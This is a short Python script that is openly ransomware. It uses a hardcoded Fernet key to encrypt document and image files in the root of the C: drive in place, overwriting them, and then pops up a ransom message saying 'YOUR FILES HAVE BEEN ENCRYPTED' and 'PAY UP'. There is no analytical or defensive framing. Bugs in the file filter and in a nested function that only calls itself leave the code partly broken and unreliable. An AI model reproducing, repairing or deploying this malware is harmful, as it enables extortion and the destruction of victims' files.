#!/usr/bin/python3.8
import os
import tkinter
from tkinter import messagebox

from cryptography.fernet import Fernet


def encrypt_files():
    # This function encrypts the files with a key
    key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="

    # Get files to encrypt
    if os.path.isdir("C:\\"):
        for f_name in os.listdir('C:\\'):
            if f_name.endswith('.txt', '.pdf', '.ppt', '.xlsx',
                               '.png', '.jpeg', '.docx', '.doc'):
                file_name = f_name

                def enc():
                    # Start encryption
                    fn = file_name
                    k = key
                    f = Fernet(k)

                    with open(fn, "rb") as file:
                        file_data = file.read()
                        encrypted_data = f.encrypt(file_data)

                    with open(fn, "wb") as file:
                        file.write(encrypted_data)

                    enc()

                def message():
                    # this function prompts a window containing the ransom message
                    window = tkinter.Tk()
                    window.wm_withdraw()
                    header = "HELLO... YOUR FILES HAVE BEEN ENCRYPTED"
                    body = "PAY UP"
                    messagebox.showinfo(title=header, message=body)

                message()
            else:
                pass
    else:
        pass


def main():
    encrypt_files()


if __name__ == "__main__":
    main()
